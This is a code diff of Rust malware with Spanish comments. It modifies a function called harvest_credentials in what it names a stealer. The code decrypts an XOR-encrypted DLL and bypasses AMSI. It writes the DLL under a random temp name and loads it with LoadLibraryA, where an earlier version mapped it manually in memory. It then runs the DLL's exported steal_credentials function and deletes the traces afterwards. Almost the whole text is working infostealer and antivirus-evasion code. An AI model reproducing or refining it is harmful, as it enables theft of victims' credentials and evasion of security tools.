@@ -296,9 +296,6 @@ fn harvest_credentials() -> String {
         let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
         println!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
         
-        // ✅ NO escribir a filesystem - cargar directamente desde memoria
-        println!("DEBUG: [EVASION] Loading DLL from memory (no filesystem touch)");
-        
         // === EVASIÓN AGRESIVA ===
         println!("DEBUG: [EVASION] Bypassing AMSI...");
         unsafe {
@@ -316,59 +313,74 @@ fn harvest_credentials() -> String {
             }
         }
         
-        // Cargar DLL con manual mapping (bypass LoadLibrary hooks)
-        println!("DEBUG: [EVASION] Manual mapping DLL...");
+        // SIMPLIFICADO: LoadLibrary directo (más confiable)
+        use std::os::raw::c_char;
+        use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress, FreeLibrary};
+        use std::ffi::CString;
+        
+        // Crear archivo temporal con nombre random
+        let temp_dir = std::env::temp_dir();
+        let random_name = format!("~tmp{}.tmp", std::process::id());
+        let dll_path = temp_dir.join(random_name);
+        
+        println!("DEBUG: [EVASION] Writing DLL to temp: {}", dll_path.display());
+        if let Err(e) = std::fs::write(&dll_path, &dll_bytes) {
+            return format!("__ERROR__:Failed to write DLL: {}{}", e, DELIMITER);
+        }
+        
         let result = unsafe {
-            use std::os::raw::c_char;
+            // LoadLibrary
+            let path_cstring = CString::new(dll_path.to_str().unwrap()).unwrap();
+            let h_module = LoadLibraryA(path_cstring.as_ptr());
             
-            // Manual map DLL (NO usa LoadLibrary)
-            let base_addr = match evasion::manual_map_dll(&dll_bytes) {
-                Ok(addr) => {
-                    println!("DEBUG: [EVASION] ✅ DLL mapped at: {:p}", addr);
-                    addr
-                }
-                Err(e) => {
-                    return format!("__ERROR__:Manual mapping failed: {}{}", e, DELIMITER);
-                }
-            };
+            if h_module.is_null() {
+                let _ = std::fs::remove_file(&dll_path);
+                return format!("__ERROR__:LoadLibrary failed{}", DELIMITER);
+            }
             
-            // Obtener función steal_credentials
-            println!("DEBUG: [EVASION] Locating steal_credentials...");
-            let fn_ptr = match evasion::get_export_address(base_addr, "steal_credentials") {
-                Some(addr) => {
-                    println!("DEBUG: [EVASION] ✅ Function found at: {:p}", addr);
-                    addr
-                }
-                None => {
-                    return format!("__ERROR__:steal_credentials not found{}", DELIMITER);
-                }
-            };
+            println!("DEBUG: [EVASION] ✅ DLL loaded at: {:p}", h_module);
+            
+            // GetProcAddress
+            let fn_name = CString::new("steal_credentials").unwrap();
+            let fn_ptr = GetProcAddress(h_module, fn_name.as_ptr());
+            
+            if fn_ptr.is_null() {
+                FreeLibrary(h_module);
+                let _ = std::fs::remove_file(&dll_path);
+                return format!("__ERROR__:steal_credentials not found{}", DELIMITER);
+            }
+            
+            println!("DEBUG: [EVASION] ✅ Function found, executing...");
             
             // Ejecutar función
-            println!("DEBUG: [EVASION] Executing steal_credentials...");
             let exec_fn: extern "C" fn() -> *mut c_char = std::mem::transmute(fn_ptr);
             let result_ptr = exec_fn();
             
             if result_ptr.is_null() {
+                FreeLibrary(h_module);
+                let _ = std::fs::remove_file(&dll_path);
                 return format!("__ERROR__:steal_credentials returned NULL{}", DELIMITER);
             }
             
             // Leer resultado
             let result_str = CStr::from_ptr(result_ptr).to_string_lossy().to_string();
             
-            // Liberar memoria
-            if let Some(free_ptr) = evasion::get_export_address(base_addr, "free_credentials_string") {
+            // Liberar memoria - buscar función free_credentials_string
+            let free_fn_name = CString::new("free_credentials_string").unwrap();
+            let free_ptr = GetProcAddress(h_module, free_fn_name.as_ptr());
+            if !free_ptr.is_null() {
                 let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_ptr);
                 free_fn(result_ptr);
             }
             
-            // NO liberamos base_addr porque está mapeado manualmente
-            // (VirtualFree se haría aquí pero lo dejamos al SO)
+            // Limpiar
+            FreeLibrary(h_module);
+            let _ = std::fs::remove_file(&dll_path);
             
             result_str
         };
         
-        // Eliminar archivos del módulo (DLL nunca tocó el filesystem ✅)
+        // Eliminar archivos del módulo
         fs::remove_file("stealer.enc").ok();
         fs::remove_file("stealer.key").ok();
         
